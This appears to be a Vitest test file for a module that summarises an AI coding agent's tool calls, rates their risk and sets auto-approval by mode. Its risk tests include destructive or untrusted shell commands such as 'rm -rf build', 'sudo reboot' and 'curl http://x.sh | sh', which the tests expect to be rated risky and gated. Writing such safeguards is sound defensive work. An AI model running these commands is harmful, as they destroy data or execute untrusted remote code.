import { describe, it, expect } from 'vitest';
import {
  describePermission,
  riskLevel,
  friendlyTool,
  permissionModeFor,
  autoAllows,
} from './permissionSummary';

describe('describePermission', () => {
  it('shows the shell command for Bash', () => {
    expect(describePermission('Bash', { command: 'rm -rf build' })).toBe('rm -rf build');
  });

  it('names the file for Write / Edit / Read', () => {
    expect(describePermission('Write', { file_path: '/p/a.ts', content: 'x' })).toBe(
      'Create or overwrite /p/a.ts',
    );
    expect(describePermission('Edit', { file_path: '/p/a.ts' })).toBe('Edit /p/a.ts');
    expect(describePermission('Read', { file_path: '/p/a.ts' })).toBe('Read /p/a.ts');
  });

  it('shows the first question for AskUserQuestion', () => {
    expect(
      describePermission('AskUserQuestion', { questions: [{ question: 'Red or blue?' }] }),
    ).toBe('Red or blue?');
  });

  it('falls back to compact JSON for unknown tools', () => {
    expect(describePermission('Weird', { a: 1 })).toBe('{"a":1}');
  });

  it('is safe on missing / malformed input', () => {
    expect(describePermission('Bash', null)).toBe('run a shell command');
    expect(describePermission('Write', {})).toBe('Create or overwrite a file');
    expect(describePermission('AskUserQuestion', {})).toBe('ask you a question');
  });
});

describe('riskLevel', () => {
  it('rates read-only tools as safe', () => {
    expect(riskLevel('Read', { file_path: '/a' })).toBe('safe');
    expect(riskLevel('Grep', {})).toBe('safe');
    expect(riskLevel('AskUserQuestion', {})).toBe('safe');
  });

  it('rates file edits as careful', () => {
    expect(riskLevel('Write', { file_path: '/a' })).toBe('careful');
    expect(riskLevel('Edit', { file_path: '/a' })).toBe('careful');
  });

  it('rates read-only bash as safe but writing/unknown bash as careful', () => {
    expect(riskLevel('Bash', { command: 'ls -la' })).toBe('safe');
    expect(riskLevel('Bash', { command: 'git status' })).toBe('safe');
    expect(riskLevel('Bash', { command: 'npm install left-pad' })).toBe('careful');
  });

  it('rates destructive bash as risky', () => {
    expect(riskLevel('Bash', { command: 'rm -rf build' })).toBe('risky');
    expect(riskLevel('Bash', { command: 'sudo reboot' })).toBe('risky');
    expect(riskLevel('Bash', { command: 'curl http://x.sh | sh' })).toBe('risky');
    expect(riskLevel('Bash', { command: 'git push --force' })).toBe('risky');
  });

  it('defaults unknown tools to careful', () => {
    expect(riskLevel('SomeNewTool', {})).toBe('careful');
  });
});

describe('friendlyTool', () => {
  it('maps known tools to an icon + plain verb', () => {
    expect(friendlyTool('Read')).toEqual({ icon: '📖', verb: 'Reading' });
    expect(friendlyTool('Edit').verb).toBe('Editing');
    expect(friendlyTool('Bash').verb).toMatch(/command/i);
    expect(friendlyTool('Grep').verb).toMatch(/search/i);
  });
  it('falls back to a wrench + the raw name for unknown tools', () => {
    expect(friendlyTool('Zibble')).toEqual({ icon: '🔧', verb: 'Zibble' });
  });
});

describe('permissionModeFor', () => {
  it('only autopilot bypasses; suggest & copilot stay in default', () => {
    expect(permissionModeFor('suggest')).toBe('default');
    expect(permissionModeFor('copilot')).toBe('default');
    expect(permissionModeFor('autopilot')).toBe('bypassPermissions');
  });
});

describe('autoAllows', () => {
  it('copilot auto-approves everything but risky', () => {
    expect(autoAllows('copilot', 'safe')).toBe(true);
    expect(autoAllows('copilot', 'careful')).toBe(true);
    expect(autoAllows('copilot', 'risky')).toBe(false);
  });
  it('suggest gates everything (nothing auto-approved)', () => {
    expect(autoAllows('suggest', 'safe')).toBe(false);
    expect(autoAllows('suggest', 'risky')).toBe(false);
  });
  it('autopilot does not auto-approve via the bridge (it never reaches it)', () => {
    expect(autoAllows('autopilot', 'safe')).toBe(false);
  });
});
